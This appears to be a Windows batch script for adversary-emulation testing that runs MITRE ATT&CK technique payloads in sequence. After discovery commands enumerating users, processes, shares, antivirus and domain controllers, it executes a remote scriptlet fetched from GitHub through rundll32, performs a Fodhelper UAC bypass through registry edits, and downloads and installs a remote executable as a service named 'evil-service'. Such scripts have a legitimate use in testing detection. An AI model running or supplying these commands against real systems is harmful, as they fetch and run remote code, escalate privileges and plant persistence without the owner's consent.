@ECHO OFF
echo **********************************************
echo *          HPT Testing Script                *
echo *          Version: 0.1                      *
echo *          author: hsoc                      *
echo *                                            *
echo **********************************************

echo **********************************************
echo *      Testing Mitre ATT@CK PAYLOADS         *
echo **********************************************
pause


echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] Discovery Process
echo +++++++++++++++++++ Identify local users
powershell -c "Get-WmiObject -Class Win32_UserAccount"
echo +++++++++++++++++++ Identify active user
powershell -c "$env:username"
echo +++++++++++++++++++ Find user process
powershell -c "Get-Process"
start "" cmd /c powershell -c "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l='Owner';e={$owners[$_.id.tostring()]}};foreach($p in $ps) { if($p.Owner -eq 'Justin Hoang') { $p; }}"
echo +++++++++++++++++++ View Admin Share
powershell -c "Get-SmbShare | ConvertTo-Json"
echo +++++++++++++++++++ Discovery Anti Virus Program
powershell -c "wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value"
echo +++++++++++++++++++ Permision Group Discovery
powershell -c "gpresult /R"
echo +++++++++++++++++++ Identify Firewall
powershell -c "$NameSpace = Get-WmiObject -Namespace 'root' -Class '__Namespace' | Select Name | Out-String -Stream | Select-String 'SecurityCenter';$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace root\$SecurityCenter -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"
echo +++++++++++++++++++ Find Domain Controler
powershell -c "nltest /dclist:%USERDOMAIN%"
::timeout 5

echo [+++++++++++++++++++++++++++++++++++++++++] T1085 - Rundll32 execute JavaScript Remote Payload With GetObject
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/hsoc-t1085.sct").Exec();

::timeout 5

echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1088 - Bypass UAC using Fodhelper
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe
::timeout 5

::echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1050 - Service Installation
::bitsadmin.exe /transfer /Download /priority Foreground https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true %temp%\service.exe
powershell -c Invoke-WebRequest -Uri "https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true" -OutFile "%temp%\service.exe"
sc.exe create evil-service binPath= %temp%\service.exe
sc.exe start evil-service
::timeout 5

echo [+++++++++++++++++++++++++++++++++++++++++] T1143 - Run Hidden Window
start "" cmd /c powershell -c "Start-Process notepad.exe -WindowStyle hidden"
::timeout 5

echo [+++++++++++++++++++++++++++++++++++++++++] T1202 - Indirect Command Execution - pcalua.exe
FOR /L %%A IN (1,1,10) DO (
    calc.exe
)


pause

